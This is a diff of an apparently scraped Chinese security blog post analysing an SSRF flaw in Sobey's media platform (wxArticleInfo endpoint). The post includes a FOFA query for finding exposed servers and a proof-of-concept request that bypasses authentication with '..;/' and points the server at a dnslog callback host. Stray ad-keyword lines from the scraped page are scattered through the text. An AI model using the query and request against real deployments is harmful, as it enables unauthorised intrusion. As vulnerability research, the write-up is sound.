@@ -7,17 +7,9 @@ asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintwxarticleinfo-ss
 # 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/8/29 11:30
-- 631浏览
+- 635浏览
 - [0评论](#comment)
 - 25分钟阅读
-
-深入探索
-
-授权
-
-代理服务器
-
-服务器
 
 ---
 
@@ -32,8 +24,6 @@ asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintwxarticleinfo-ss
 # fofa语法
 
 > icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
->
-> 计算机服务器
 
 # 漏洞分析
 
@@ -43,15 +33,7 @@ asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintwxarticleinfo-ss
 
 直接进入看它的实现逻辑如下
 
-漏洞修复方案
-
-深入探索
-
-SQL注入检测工具
-
-编码转换工具
-
-服务器安全服务
+计算机服务器
 
 ```
 @RequestMapping(
@@ -77,6 +59,8 @@ public Response wxArticleInfo(@RequestParam("token") String token, @RequestParam
 ```
 
 参数**wxurl**被带入`parseWXDoc`方法，跟进查看其实现逻辑
+
+漏洞修复方案
 
 ```
 private static Map<String, String> parseWXDoc(String requestUrl) {
@@ -108,8 +92,6 @@ requestUrl被直接使用Jsoup.connect进行访问，整个过程中对**wxurl�
 # 漏洞复现
 
 > 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
->
-> 漏洞修复方案
 
 ```
 GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=http://xxe.dnslog.pt/xxe_test HTTP/1.1
